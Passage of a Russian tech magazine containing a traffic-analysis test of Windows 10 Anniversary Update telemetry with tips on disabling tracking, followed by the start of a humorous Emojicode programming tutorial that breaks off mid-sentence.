  речисленных данных, принимая лицензионное соглашение и связанные с ним
  документы. «Это соглашение в соответствии с Гражданским кодексом явля-
  ется публичной офертой. Акцепт оферты означает безоговорочное принятие
  всех ее условий», — констатирует Роскомнадзор.
     Так ситуация выглядит де-юре, а де-факто большинство людей воспри-
  нимает лицензионное соглашение как пустую формальность. Представь, что
  твой друг купил новый девайс с Windows 10. Вряд ли он сдаст его обратно
  только потому, что какой-то пункт из длинного юридического заклинания ему
  покажется неприемлемым. Побыстрее нажать «Согласен» хочется и в том слу-
  чае, если компьютер вдруг по недосмотру самовольно обновился до Windows
  10. Или же сработало желание успеть заполучить обновление бесплатно,
  пока дают, и неважно, что там написано в соглашении. В общем, сложившая-
  ся практика добровольно-принудительного перевода людей на Windows 10 —
  это, на мой взгляд, скорее публичная афера, чем оферта.
 Десять нововведений в Windows 10

  1. В меню «Пуск» часть кнопок стала отображаться слева. Пункт «Все приложе-
     ния» убрали, а списки приложений объединили.





                                                      Обновленное меню «Пуск»

  2. В панели задач поверх иконок приложений теперь отображаются уведом-
    ления — например, иконка почтового клиента и число новых сообщений.
    Показ уведомлений и поведение всей панели можно настроить в разделе
     «Персонализация».
  3. Центр уведомлений стал более информативным и заодно — надоедливым.
     Теперь, кроме текста, он содержит изображения. Зато события из персо-
     нального календаря могут отображаться в системных часах. Удобно, по-
     скольку не надо делать лишних телодвижений, чтобы посмотреть заплани-
    рованные мероприятия. Например, вчера надо было сдать статью... О черт!
     Что же Кортана не напомнила?!
  4. Персональная помощница стала доступна прямо на экране блокировки. Те-
    перь она используется практически во всех приложениях. За прошедший
     год Кортана выучила восемь новых языков, но так и не освоила русский. По-
     этому нас мало касается, что полностью отключить Кортану стало гораздо
     сложнее. Штатными средствами это сделать вообще невозможно — она
     глубоко интегрирована в систему вместе с поиском Bing.
  5. Браузер Edge теперь поддерживает расширения. Например, можно устано-
     вить один из сортов «Адблока».





                                                              Edge можно
                                                            нафаршировать
                                                           аддонами


     Удивляет рекомендация, как отключить персонализированную рекламу.
    От нее можно отказаться, если будешь сохранять все куки (включая сторон-
     ние) и не чистить историю браузера. Оригинально!





                                Рекламу смотри как все, но журнал и печеньки оставь

  6. С прошлой сборки Windows 10 осталась возможность использовать команд-
    ный процессор Bash, но скрипты по-прежнему выполняются не все. Зато
     теперь в Anniversary Update можно также запустить некоторые приложения
     для Linux (сказал бы кто об этом пару лет назад — сочли бы шуткой) и обо-
     лочку рабочего стола Ubuntu Unity.
  7. Появился Windows Ink. Это целый пакет приложений для рукописного ввода.
    Он актуален для устройств с сенсорным экраном (вроде Microsoft Surface).
   Мы же тестировали Windows 10 на десктопе с обычным монитором.
  8. Традиционные пароли постепенно вытесняет биометрика. Инструмент
    Windows Hello реализует защиту с помощью биометрической аутентифика-
    ции в приложениях и браузере Microsoft Edge.
  9. Многие изменения Anniversary Update касаются разработчиков. Стали до-
     ступны .NET Core 1.0.0 и Visual Studio Code, а также Visual Studio 15 Preview 3.
  10. Появилась возможность добавить в классическое приложение API из UWP
     (см. Project Centennial и руководство по конвертации). Можно также доба-
     вить поддержку Xbox One или HoloLens для своего UWP-приложения.



 ОДИН МИР. ОДНА ОС
  Под лозунгом «Одна платформа для всех» (мне кажется или он отдает чем-
  то нацистским?) 2 августа 2016 года Windows 10 Anniversary Update стала до-
  ступна на компьютерах и всевозможных мобильных устройствах, включая
  Microsoft HoloLens — девайс, который накладывает голографические изобра-
  жения на реальные объекты. С ним можно почувствовать себя аугментирован-
  ным без использования меток, камер, смартфонов и даже без подключения
  к десктопу. Это красивый способ продвижения «десятки», которая, по версии
  Microsoft, претендует на роль универсальной цифровой экосистемы.
    «Мы призываем всех переходить на Windows 10, вне зависимости от того,
  являетесь ли вы обладателем нового ПК, компьютера пятилетней давности
  или новейшего компьютера Mac, потому что мы создаем для вас самую на-
  дежную, производительную и увлекательную платформу», — пишет в корпо-
  ративном блоге Терри Майерсон, исполнительный вице-президент Microsoft
  и глава подразделения Windows & Devices. Что ж, как минимум насчет увлека-
  тельности не поспоришь. Сейчас мы проведем крайне увлекательный тест!

 МЕТОДИКА ЭКСПЕРИМЕНТА
  Как и в прошлый раз, мы выполнили чистую установку Windows 10 Pro (32-bit, v.
  1607 build 14393.51) и стали изучать ее поведение. Подсматривать за подсматри-
  вающим нам помогли те же самые программы, что уже использовались для те-
  стов «десятки». Это снифер Wireshark, HTTP-прокси Fiddler, монитор сетевых со-
  единений TCPView и разные вспомогательные утилиты, не требующие установки.
      Fiddler инсталлируется как обычное приложение. Wireshark доступен в виде
  портативной сборки, но для работы ему требуется установка библиотеки
  WinPcap. Она работает как драйвер канального уровня и позволяет перехва-
  тывать сетевые пакеты в обход стека протоколов. Поэтому Fiddler и Wireshark
 мы оставили на последнюю часть эксперимента. Сетевой трафик анализиро-
  вался сначала при полностью отключенных следящих компонентах, а затем —
  в рекомендуемых настройках Windows 10.

 ПАССИВНЫЙ ТЕСТ
  Любопытно, что по-прежнему не все следящие функции
  можно отключить при установке. Уже после нее мы допол-
  нительно в панели управления закрыли доступ к камере,                                                 WARNING
  микрофону, радиомодулям, заблокировали доступ к кон-
  тактам, календарю, журналу вызовов, электронной почте,      Приведенная в статье
 SMS и MMS, уведомлениям, сведениям об учетной записи,   информация получена
                                                                                  в ходе собственных  а также запретили взаимодействовать с приложениями                                                                                 исследований. Она
  на других устройствах и получать сведения в фоне.                предоставлена
     Конечно, часть этих возможностей облегчает исполь-      исключительно
                                                                                  в ознакомительных  зование Windows 10 в повседневной жизни, но на данном                                                                                       целях. Результаты
  этапе нас интересовала чистота эксперимента и сама воз-                                                                                    могут отличаться
  можность обеспечить конфиденциальность штатными сред-        на разном
  ствами. Большинство этих настроек доступны по адре-      оборудовании.
                                                                       Ни редакция,
  су «Пуск   Параметры   Обновление и безопасность                                                                             ни автор не несут
  Дополнительные параметры    Параметры конфиденци-      ответственности
  альности». В отдельных вкладках отключаются «Защитник    за любой возможный
                                                                                           вред.  Windows», служба облачной проверки и поиск в интернете.
    При установке и первом запуске операционки сетевой адаптер был отключен.
  Чистая «десятка» запустилась в офлайне, но сразу несколько системных процес-
  сов стали слушать порты. Будем считать это отправной точкой в наших тестах.





                                             Windows 10 ждет подключения к сети

  Подсоединившись к сети, мы не стали сразу гулять по интернету и запускать
  встроенные приложения. Многие из них попытаются подключиться к облачным
  сервисам, а нам было бы интересно отловить главных шпионов. Поэтому мы
  лишь откроем в Edge одну страничку (то самое заявление о конфиденциально-
  сти) и проверим работу центра обновлений. Привычная команда wuapp теперь
  не работает, поэтому, чтобы не генерировать лишний трафик кликами по меню
  «Пуск», мы откроем панель управления командой control. Сразу нашлись два
  обновления (KB3176495 и KB3176929). Ставим их, перезагружаемся и ждем
  полчаса в засаде, поглядывая на ожившее окно TCPView, а затем читаем логи.
    За время первого теста Windows 10 суммарный трафик составил 47,5
  Мбайт. Из них 17,2 Мбайт ушло на браузер Edge, хотя просмотренная стра-
  ничка с заявлением занимает около мегабайта. Еще 28,9 Мбайт потрачено
  от имени системы (вместе с двумя обновлениями), и еще чуть меньше мега-
  байта набегает в сумме на разные приложения.
    Довольно неплохой результат! Год назад паразитный трафик в подоб-
  ном тесте измерялся сотнями мегабайтов. Впрочем, хорошим такой подытог
  тоже не назовешь. Несмотря на полное отключение всех следящих функций
  штатными средствами, частичные сведения о пользователе и его устройстве
  все равно продолжают собираться. Активнее всех тянули данные серверы
  Microsoft Informatica Ltda в Бразилии (191.232/14) и подсети NET137 в Редмон-
  де (137.117.0.0/16). Немало трафика циркулировало и через серверы достав-
  ки контента Akamai Technologies в штате Массачусетс.

 АКТИВНЫЙ ТЕСТ
  Если в пассивном режиме мы просто сидели в засаде, прочитав соглашение
  и один раз обновив операционку, то на следующем этапе будем специально
  провоцировать «десятку». Посмотрим, как Windows 10 отреагирует на мини-
  мальную активность пользователя.
   Мы запустили браузер Edge, настроили его так, чтобы открывался на пустой
  странице, отключили предугадывание запросов по мере ввода в адресной
  строке и перешли на сайт bing.com. После этого включаем снифер и отправ-
  ляем один поисковый запрос через Bing. Через несколько секунд останавли-
  ваем перехват пакетов и смотрим, что вышло. Улов впечатляет!
    За какие-то несколько секунд были установлены соединения с 31 сервером
  и отправлены запросы в шесть стран. Если мы напрямую использовали Bing,
  то при чем здесь Google, Yandex и Yahoo? Про остальных незваных участников
  сетевого парада вообще молчу.





                            Один запрос генерирует трафик на три десятка серверов

  При использовании Edge данные постоянно отправляются на бразильские
  серверы Microsoft Informatica. Утекают они зашифрованными (TLS v. 1.2), а от-
  сылает их не только сам Edge, но и системный процесс с нулевым значением
  PID. Общее число одновременных сетевых соединений приближается к сотне
  (после единственного поискового запроса их было 94).





                                                 Поток конфиденциальных данных

 В окне TCPView все время висит несколько подключений msnbot (даже когда
  Edge выгружен), а также периодически возникает процесс SearchUI — сто-
  ит лишь дотронуться до клавиатуры. Он появляется даже при отключенной
  функции «Искать в интернете» и генерирует исходящий трафик — в основном
  на редмондские серверы компании и в бразильскую подсеть MS Informatica.





                                              MSN-бот ставит рекорды аплоада

  Самый назойливый сервис сбора «диагностических» данных  Diagnostics
  Tracking Service (DiagTrack) исчез из списка служб еще в прошлом году. Одна-
  ко победу праздновать рано. Он всего лишь был переименован в Connected
  User Experiences and Telemetry («Служба политики диагностики» в русской вер-
  сии). Именно этот сервис постоянно работает в фоне, собирает и отправля-
  ет в Microsoft «сведения технического характера». Отключить его можно через
  управление службами (services.msc).





                                                  Секретная служба «диагностики»
 ВСЕ ВКЛЮЧЕНО!
  Настало время выйти из тени. Убираем все ограничения на передачу конфи-
  денциальных данных, включаем Wireshark и три часа ничего не делаем. Это моя
  любимая часть эксперимента. За время пассивного мониторинга снифер пе-
  рехватил подключения к 102 разным IP-адресам из 17 подсетей. Самый боль-
  шой исходящий трафик (до 391 Кбайт на каждый из шести потоков) был заре-
  гистрирован к серверам из сети доставки контента Akamai. В ответ с них было
  загружено 30 Мбайт — это обновление KB890830. Однако уже на втором ме-
  сте оказалась все та же шпионская организация Microsoft Informatica. За вре-
  мя теста на ее серверы утекло полмегабайта данных в два потока. Для текста
  это чертовски много. Более подробную картину можно увидеть на скриншоте
  IPNetInfo, в окошке которого представлены 17 IP-адресов (по одному в каждой
  подсети). Они перечислены в порядке уменьшения исходящего трафика.





                                          Улов за три часа в настройках по умолчанию

  Повторим тест, но на этот раз вместо Wireshark запустим Fiddler. Поразитель-
  но, но через три часа его окошко осталось полупустым. В нем видны только ле-
  гитимные подключения, в том числе собственный запрос на обновление. Файл
  JPEG оказался простой миниатюрой для встроенного приложения «Новости».
  Интересно, что постоянно работала синхронизация OneDrive, хотя ни одного
  документа или записи для облачной службы мы не создавали.





                                                    Скромный трафик HTTP(S)

  Если во время прошлогоднего теста данные утекали в Сеть непрерывным по-
  током, то сейчас они отправляются преимущественно короткими сессиями че-
  рез некоторые интервалы. Судя по логам Wireshark, Windows 10 в рекоменду-
  емых настройках генерирует исходящий трафик через каждый час или около
  того, даже при минимальной пользовательской активности. Средняя скорость
  обмена с серверами Microsoft составила 18 538 пакетов в час, или по пять па-
  кетов каждую секунду.





                                                             График про трафик

 В отличие от TCPView, который показывает картину в реальном времени,
  Wireshark помогает собрать много интересной статистики за длительный пе-
  риод. Судя по данным трехчасового мониторинга, больше всего система об-
  ращалась к 22 IP-адресам. Причем с первыми девятью из них соединения
  были установлены практически все время. Исключение из них составляет толь-
  ко Twitter — это активность встроенного приложения.





                                                Явки главных шпионов Microsoft

 МИФЫ И ЛЕГЕНДЫ
  Среди утверждений о шпионских привычках Windows 10 встречаются и та-
  кие, которые наш эксперимент не подтверждает. Мы расшифровывали даже
  HTTPS-трафик, установив собственный корневой сертификат, но ни в одном
  исходящем пакете не нашли:
  •  отправки изображения с веб-камеры;
  •  отправки скриншотов экрана;
  •  отправки документов с флешки.

  Пожалуй, все это можно считать мифами, но для их окончательного развен-
  чивания требуется куда больше данных. Единичный отрицательный результат
  говорит только о том, что мы не зарегистрировали ничего подобного в нашей
  системе. Это слабое утешение, поскольку на тесты были наложены важные
  ограничения: мы не выполняли активацию и вход в аккаунт Microsoft, не ис-
  пользовали Кортану и рукописный ввод. К тому же все исследования прово-
  дились на стационарном компьютере. Мобильные устройства имеют больше
  встроенных сенсоров, для них доступно меньше сторонних средств контроля,
  а значит, и шпионить с их помощью куда проще.

 ВЫВОДЫ
  За все время эксперимента (пять суток, включая повторные тесты) общий тра-
  фик составил около 125 Мбайт. Из них примерно половина (67 Мбайт) запи-
  сана на счет системы и включает загрузку трех обновлений. Следящих функ-
  ций в новой сборке Windows 10 явно стало меньше. Однако даже при полном
  запрете сбора данных штатными средствами система не прекращает их на-
  капливать и отправлять. Тестовый период давно закончился, а сомнительные
  методы сбора данных частично остались в готовом продукте и после его юби-
  лейного обновления. Похоже, в компании не видят разницы между клиентами
  и бета-тестерами.
    Если использовать рекомендуемые настройки, то основными шпиона-
  ми становятся Кортана и глубоко интегрированные средства поиска, а также
  служба политики диагностики. Дополнительно «Защитник Windows» отправля-
  ет на серверы Microsoft любые файлы, которые сочтет подозрительными или
  потенциально опасными. SmartScreen и Edge отсылают списки всех поисковых
  запросов и посещенных веб-страниц. Через журнал местоположений реги-
  стрируются актуальные географические координаты и все физические пере-
  мещения устройства.

 В Windows 10 многое происходит внезапно™

  Неожиданная установка еще полбеды. В случае инсталляции Windows 10
  Anniversary Update период отката на предыдущие версии сокращен с одного
  месяца до десяти суток. Это касается как обновления с Windows 7, 8 и 8.1, так
  и чистой установки.
    Пока мы ждали очередной отчет, компьютер вдруг попытался завершить
  работу. Это Windows 10 по-тихому установила очередное обновление и захо-
  тела ребута. От внеплановой перезагрузки спас открытый «Блокнот» с набран-
  ным словом test. Если не хочешь, чтобы «десятка» вырубалась сама, измени
  настройки (Параметры  Обновление и безопасность   Изменить период ак-
  тивности) или просто держи несохраненную страницу «Блокнота» в фоне.
    Еще во время сбора статистики для тестовых версий Windows выяснилось,
  что основная масса пользователей оставляет настройку «Устанавливать об-
  новления автоматически». Поэтому теперь информация о новых обновлени-
  ях поступает не во всплывающем окне, а на экране приветствия. Фактически
  пользователя просто уведомляют об их загрузке и установке.
    Очередное обновление запросто может изменить настройки конфиденци-
  альности, поэтому проверяй их почаще. Апдейты могут приводить даже к при-
  нудительной деинсталляции сторонних антивирусных программ и включению
  «Защитника Windows». С подобными медвежьими услугами уже сталкивались
  многие пользователи.


 РЕКОМЕНДАЦИИ
  Если приватность для тебя еще что-то значит, то для начала можно отключить
  все неиспользуемые следящие функции штатными средствами. Многое бло-
  кируется еще на этапе установки Windows 10, а после нее настраивается че-
  рез «Параметры».





                                                        Настройка при установке





                                                               Отчеты? Никогда!

  Дополнительно можно остановить «Службу политики диагностики» и «Службу
  маршрутизации push-сообщений WAP». После этого лучше деинсталлировать
  облачный клиент OneDrive, если не планируешь его использовать. Затем
  в консоли Taskschd.msc стоит запретить задания со словом telemetry, упоми-
  нанием Customer Experience Improvement Program и CloudExperienceHost. Так-
  же можно деактивировать задания компонентов Family  Safety monitoring
  и Software Quality Management.
    В корпоративных версиях Windows 10 отправку конфи-
  денциальных данных можно уменьшить, изменив групповую
  политику Allow Telemetry. В русскоязычной версии она назы-
  вается «Сбор данных».
    Все «неотключаемые» сервисы деактивируются через
  реестр, но для этого придется править слишком много па-    WWW
  раметров. К тому же их названия могут меняться, так что ста-
                                                                                Утилиты для уда-  рые рецепты в виде готовых reg-файлов после очередного                                                                                ления следящих
  обновления частично перестают действовать.                                                                             функций через
    Сэкономить время сильно помогают утилиты Disable-          реестр:
  WinTracking и Destroy-Windows-10-Spying. В отличие от мно-
                                                                                         DisableWinTracking
  гих аналогов они распространяются с открытыми исходника-
  ми и хорошо документированы. Просто выбери ту, которая          Destroy-
  на данный момент имеет более свежую версию. Либо рас-     Windows-10-Spying
  слабься и постарайся получить удовольствие от глубокого
  внимания к своей персоне.
PCZONE





                                                                                   Олег Парамонов
                                                                                                paramonov@sheep.ruВИНОГРАД
БЕЗУМИЯПРОГРАММИРУЕМ БЕЗ БУКВ НА EMOJICODE





Сегодня мы откажемся от традиционных средств ком-
муникации и научимся программировать при помощи
зверей, плодов и десертов. Мы испытаем просветление,
поймем, как пиво помогает избежать ошибок, и, посте-
пенно утрачивая рассудок, составим интерпретатор языка
Brainfuck из девяти лимонов, двадцати двух арбузов и ше-
сти шоколадок.

ЯЗЫК БУДУЩЕГО
Однажды я прочитал, что за всю человеческую историю письменность изобре-
ли всего два или три раза. Все остальное — это производные того, что тыся-
чи лет назад придумали в Шумере, Китае и, возможно, в долине Инда. Если
это в самом деле так, то шумерам пора подвинуться. Не так давно появилась
четвертая письменность, превосходящая предшественников по всем статьям.
 Речь, конечно, об эмодзи.
   Нелепость и ограниченность этой смартфонной азбуки не должна смущать.
Пиктограммы, которыми пять тысяч лет назад пользовались жители долины
Инда, были куда нелепее и при этом не позволяли записать даже простое сло-
во «баклажан». А эмодзи не только позволяют, но еще и наполняют эту почтен-
ную сельскохозяйственную культуру новыми удивительными смыслами.
   У людей, связанных с компьютерами, эмодзи должны вызывать особенно
живой интерес. Эксперты давно предрекают, что обыкновенные ПК будут вы-
теснены смартфонами и планшетами. И что тогда станут делать программи-
сты? Мучительно вводить при помощи экранной клавиатуры зарытые на треть-
ем уровне фигурные скобки? Готовиться можно начинать прямо сейчас, и один
из способов — полностью избавиться от печатных команд и использовать
вместо них эмодзи.
    Гуглу известны по меньшей мере три языка программирования, создатели
которых заменили устаревшие буквы и цифры на эмодзи: Emojicode, Emojilisp и
    (https://github.com/4Lang/4). Emojilisp скучноват. У клевера нет документа-
 ции. Выбор очевиден — учим эмодзикод!

ТВОЙ ПЕРВЫЙ ФРУКТ
Первая программа, которую пишут на любом языке программирования, —
это Hello World. Не будем изобретать велосипед и последуем традиции. Вот
 как Hello World выглядит на эмодзикоде.





Попробуем разобраться, что мы видим.
Клетчатый флажок (:checkered_flag:) — это обозначение метода, с которого
интерпретатор начнет исполнение программы. Его можно сравнить с мето-
дом main в Java. В эмодзикоде, как и в Java, не бывает неприкаянных функций,
и к клетчатому флажку это относится в полной мере. В ранних версиях язы-
 ка программисту полагалось явно декларировать класс, к которому относит-
ся этот метод, но потом синтаксис упростили. Этот класс по-прежнему есть,
но теперь его автоматически добавляет сам компилятор.
   Ухмылка (:grinning:) — это метод объекта строка, который распечатывает ее
содержимое. Для вызова метода сначала указывают его эмодзи, а затем объ-
 ект, к которому происходит обращение. Им в данном случае служит литерал
строки «Hello World!». Он окружен квадратиками с буквами abc: в эмодзикоде
они заменяют кавычки.
  И наконец, виноград и арбуз — две главные ягоды эмодзикода. В этом язы-
ке они играют ту же роль, что и фигурные скобки в си или JavaScript или ключе-
вые слова begin и end в Pascal. Любой блок кода должен быть заключен между
ними. В начале — виноград (:grapes:). В конце — арбуз (:watermelon:).
   При первом столкновении с эмодзикодом хочется понять принцип, по ко-
торому создатель языка отбирал эмодзи. Не стоит — это не пойдет на поль-
 зу психике. Примерно с той же проблемой сталкиваются люди, которые изу-
чают иероглифическую письменность. Они узнают, что, например, японский
иероглиф 鮮, означающий свежесть, состоит из рыбы и овцы, а стыд (恥) — из уха
и сердца. Какая связь между стыдом и ухом? При чем тут рыба и овца? Это не-
возможно понять — только запомнить.
   Так и с эмодзикодом. Запоминай: виноград и арбуз. Смысла нет.

Компиляция и исполнение

Для начала нужно скачать сам эмодзикод с его страницы на GitHub. Выбирай
самую свежую версию: в новых бетах меньше ошибок, чем в старых релизах.
   Исходные файлы на эмодзикоде имеют расширение .emojic. Перед запу-
ском их нужно скомпилировать.

emojicodec hello.emojic

Компилятор сохраняет полученный байт-код в файл с расширением .emojib.
Его нужно запустить при помощи интерпретатора.

emojicode hello.emojib

И hello.emojic, и все прочие программы из этой статьи можно взять отсюда.



МЕДВЕДЬ С ПИРОГОМ И ДВУМЯ ПИСТОЛЕТАМИ
Написав Hello World, понимаешь: будущее пока не настало. Мы всё еще про-
граммируем при помощи компьютеров, которые совершенно не приспосо-
блены для ввода эмодзи. Это серьезная проблема. Если мы хотим чего-то
 достичь, нам потребуется программа, которая позволит писать программы
на эмодзикоде без самих эмодзи.
   Это хорошая идея для следующего примера. Давай напишем утилиту, кото-
рая открывает файлы с исходниками, где вместо эмодзи указаны их короткие
названия. С исходниками в таком виде проще работать в текстовом редакто-
 ре. Наша утилита заменит короткие названия на соответствующие символы,
после чего передаст полученный эмодзикод компилятору. Пока мы ее делаем,
заодно познакомимся с основными конструкциями языка.
   Для начала определим класс эмодзи. Список названий, который потребу-
ется для переработки исходных файлов, будет состоять из объектов именно
этого типа.





Желтый старичок (:older_man:) отмечает комментарии. Встретив его, компи-
лятор сразу же переходит к следующей строчке. Многострочные комментарии
удобнее делать при помощи старушек (:older_woman:). Все, что попадает меж-
ду двух старушек, будет проигнорировано.
   Дальше идет главное: декларация класса.



Она всегда начинается с едва различимого на белом фоне белого кроли-
 ка (:rabbit2:). За ним следует эмодзи класса. В нашем случае это подсолнух
 (:sunflower:), но можно было бы выбрать и другой значок. И наконец, виноград,
значение которого мы уже разбирали. Весь код от него и до ближайшего арб-
 уза относится к подсолнуху.
   Пирог (:cake:) служит для объявления переменных.



После пирога необходимо указать название и класс переменной. Название
может состоять из любых символов, кроме пробелов и эмодзи; русские буквы
тоже разрешены. Что касается класса, то наши переменные относятся к клас-
 су abcd (:abcd:), то есть строки. Этот класс определен в стандартной библио-
теке эмодзикода.
   В эмодзикоде к переменным объекта может обращаться только его соб-
ственный код. Чтобы их значения можно было узнавать или менять из других
 мест, требуются модифицирующие методы: геттеры и сеттеры. У подсолнуха
 таких метода два: цветок (:blossom:) сообщает значение переменной эмодзи,
а этикетка (:label:) — значение названия.





Свинья (:pig2:) в начале строки — это признак декларации метода. В примере
рядом с ней находится цветок (:blossom:). Этот эмодзи будет использоваться
в качестве названия метода. Его, как и эмодзи класса, выбирает программист.
   После названия метода могут быть объявлены его аргументы и их типы.
Цветок из примера не требует аргументов, поэтому их тут нет, но он возвра-
щает значение. Тип возвращаемого значения необходимо сообщить после
стрелки вправо (:arrow_right:). В нашем случае это строка (:abcd:).
   Между виноградом и арбузом заключен весь код метода. Код цветка
из примера — это единственная строчка, которая при помощи яблока возвра-
щает значение переменной объекта с названием эмодзи (мы определили ее
выше). Яблоко (:apple:) в эмодзикоде соответствует ключевому слову return
в других языках.
   При создании экземпляра класса все переменные объекта должны быть
инициализированы, иначе компилятор сообщит об ошибке. Для этого служит
особая разновидность метода — инициализатор. Декларация инициализато-
ра начинается с кота (:cat2:), а не со свиньи, как у обычного метода.





Инициализатор с именем капля (:droplet:) принимает два аргумента: @эмодзи
и @название. Типы аргументов указаны сразу после их имен (в примере оба
аргумента — строки). Обычные инициализаторы не возвращают значений, по-
этому стрелки вправо в декларации капли нет.
   У класса может быть несколько инциализаторов, принимающих различные
аргументы, но у каждого из них, как и других методов, должно быть свое соб-
ственное имя, не совпадающее с другими.
   Заварной крем (:custard:) нужен для того, чтобы присваивать переменным
новые значения — примерно как ключевое слово let в бейсике. За кремом
идет название изменяемой переменной. Она приравнивается к выражению,
которое занимает остаток строчки. В примере переменной эмодзи присваи-
вается значение аргумента @эмодзи, а переменной название — аргумента @
название.





Последний метод подсолнуха, который осталось разобрать, — это ухмылка.
Подобно ухмылке строк, ухмылка подсолнуха будет распечатывать значение
 объекта. У этого метода нет аргументов, и он не возвращает значений, поэтому
в его декларации не указаны ни аргументы, ни тип возвращаемого значения.
   В коде присутствует пара незнакомых эмодзи: печенье (:cookie:) и красный
крестик (:x:). Красный крестик в литералах строк — это аналог обратной дроби
в других языках. Вместо \n (перевод строки) или \t (табуляция) в эмодзикоде
пишут :x:n или :x:t. Печенье же можно сравнить с оператором . в PHP. Оно
тоже служит для объединения строк. Принцип действия, впрочем, иной: два
печенья ставят по краям списка складываемых строк, а не между его элемен-
тами, как точки в PHP.
   Пока все просто. Теперь добавим класс, который будет заниматься ко-
е-чем посложнее: загружать библиотеку эмодзи из текстового файла, где
эмодзи и их названия сохранены в виде списка значений, разделенных табуля-
цией (tab separated values).
   Вот код этого класса.





В классе книги (:books:) объявлена только одна переменная — список. Она от-
носится к классу десерт (:ice_cream:), который служит для хранения списков —
стандартной коллекции объектов, к элементам которой можно обращаться
по их порядковому номеру. В эмодзикоде размер списка может изменяться во
время работы программы.
   Десерт — это обобщенный класс, или дженерик (generic). Его можно ис-
пользовать для того, чтобы создать список объектов любого типа. Однако тип
элементов должен быть указан при декларации переменной. Для этого после
эмодзи десерта ставят ракушку (:shell:), а затем эмодзи класса элементов.
   Переменная список — это список подсолнухов, поэтому после десер-
 та и ракушки идет подсолнух. А если бы нам понадобился, например, список
 строк, то описание его типа состояло бы из десерта, ракушки и abcd.




В инициализаторе книг мы первым делом создаем новый список подсолну-
хов и сохраняем его в словаре. Новые объекты создаются при помощи сине-
 го ромба (:large_blue_diamond:), после которого указан сначала класс нового
объекта, а затем эмодзи инициализатора. Нас интересует лягушка (:frog:) —
это инициализатор десерта, который создает пустой список.



Затем мы открываем файл с полученным в качестве аргумента именем, читаем
его содержимое и сохраняем загруженный текст в переменной исходник. Это
всего одна строчка, но в ней происходит очень много нового и непонятного.
   Начнем с мороженого. Как и крем, мороженое служит для присваивания.
Переменные, которые инициализированы мороженым, «замерзают» и не мо-
 гут быть изменены. Инструкция к языку рекомендует по возможности отда-
 вать предпочтение мороженому, а не крему. В этом случае некоторые ошибки
всплывут еще на стадии компиляции (по крайней мере, в теории). Компилятор
следит за соблюдением этого правила и выдает предупреждения, когда заме-
чает необновляемые переменные без мороженого.
   Исходник — это переменная, созданная в области видимости инициализа-
 тора, а не класса. Обрати внимание, что у нее не было пирога. Это нормально.
В таких случаях переменная создается автоматически, а ее тип определяет-
ся типом присваиваемого значения. Несмотря на такие вольности, эмодзикод
сильно типизирован. Это, среди прочего, значит, что тип переменной задает-
ся раз и навсегда. Компилятор не позволит изменить значение переменной,
которая хранила, например, строку, на, скажем, число.
   Выражения удобно разбирать справа налево. Например, выражение, ко-
торое будет присвоено исходнику, делится на две основные части. Сначала
страница (:page_facing_up: — стандартный класс для работы с файлами) за-
гружает двоичные данные. Затем двоичные данные при помощи метода abcd
преобразуются в строку.




Файл загружается при помощи классового метода картотека (:card_index:), ко-
торый относится к классу страница. Классовые методы отличаются от обычных
 тем, что их можно вызывать прямо из класса, даже не создавая объекта. Что-
бы это сделать, нужен пончик (:doughnut:). Картотека принимает на входе один
аргумент (строку @имя-файла) и возвращает двоичные данные. Но не просто
 так, а в конфетной обертке.
   Конфеты — это, пожалуй, самая любопытная и в то же время самая раздра-
жающая часть эмодзикода. Во многих языках принято сообщать об ошибках,
возвращая невозможные значения — например, NULL в си или None в Python.
Программист, вызвавший функцию, должен проверить ее результат и убе-
диться в том, что ошибки не было. В эмодзикоде эта практика формализова-
 на, и компилятор внимательно следит, чтобы ни один сомнительный результат
не остался непроверенным. Для этого и нужны конфеты.
   В эмодзикоде в случае ошибки методы возвращают так называемое ни-
 что — уникальный объект, генерируемый при помощи молнии (:zap:). Чтобы
компилятор не жаловался на несовпадение типов, при декларации метода
 к типу результата прилагают конфету (:candy:). Про такие значения говорят,
 что они в конфетной обертке. Внутри обертки может оказаться либо обещан-
ный результат, либо ничто. Пока не развернешь, не узнаешь.
  С точки зрения языка объект в обертке и сам объект относятся не к разным
типам. Пока обертка на месте, компилятор не позволит его использовать, по-
этому от нее нужно избавиться. Лучше всего это сделать при помощи манда-
рина с мороженым. Они исполняют условное присваивание, которое разво-
рачивает значение, сохраняет его в переменной и вызывает один блок кода,
если в обертке были данные, и другой, если внутри пусто (этот блок идеально
подходит для описания реакции программы на ошибку).
   В нашем случае использован более простой способ — пиво (:beer:). Пиво
разворачивает конфету и, если внутри ничего нет, останавливает программу
с сообщением о фатальной ошибке. Другими словами, оно представляет со-
бой нечто вроде оператора преобразования типа со встроенным assert. Оче-
видно, что пиво годится в двух случаях: когда правильность результата не вы-
зывает сомнений и когда фатальные ошибки не пугают.





Метод продолжается циклом (:repeat_one:), который перебирает элементы
 списка. В данном случае списка строк, созданного методом пистолет пере-
менной исходник. Пистолет разделяет строку на подстроки в тех местах, где
встречается аргумент. Мы передали ему литерал с переводом строки, поэто-
му пистолет разбил исходник на отдельные строчки. На каждом шаге перемен-
ная цикла строка принимает значения всех элементов перебираемого списка
по очереди.
   Мандарин (:tangerine:) — это условный оператор, который вызывает сле-
дующий за ним блок кода, когда выражение равно истине. Аналог else, кото-
рый срабатывает в обратном случае, в эмодзикоде тоже есть — это клубника
 (:strawberry:). В примере мандарин измеряет длину списка курицей (:chicken:)
и проверяет, чтобы в нем было больше одного элемента.
   Проверка нужна для того, чтобы безопасно извлечь свиным пятачком (:pig_
 nose:) элементы из списка разбитая-строка. Нулевой элемент оказывается
сохранен в переменной эмодзи, а первый — в названии. Остается создать
из полученных данных новый подсолнух, после чего медведь (:bear:) добавит
его в список, который мы определили раньше.
  Мы близки к финишу. Список эмодзи с описаниями, который нужен для за-
мены названий в исходниках, загружен. Осталось выполнить замену. И тут воз-
никает проблема: судя по документации, у стандартных строк нет метода, по-
зволяющего выполнять замену. К счастью, эмодзикод дает нам все средства
для ее решения.





Эмодзикод позволяет добавлять новые методы или переменные в уже суще-
ствующие классы, в том числе и в те, которые входят в стандартную библиоте-
 ку. Воспользуемся этой возможностью, чтобы расширить стандартные строки
методом палитра (:artist_palette:). Он возвращает новую строку, в которой все
подстроки, совпадающие с аргументом @было, заменены на значение аргу-
мента @стало.
   Расширение уже существующего класса очень похоже на декларацию но-
 вого, только вместо кролика используется кит (:whale2:). Обрати внимание
на собаку (:dog2:) в коде добавленного метода — это ссылка на текущий объ-
 ект, аналогичная this или self в других языках. Мы используем пистолет, чтобы
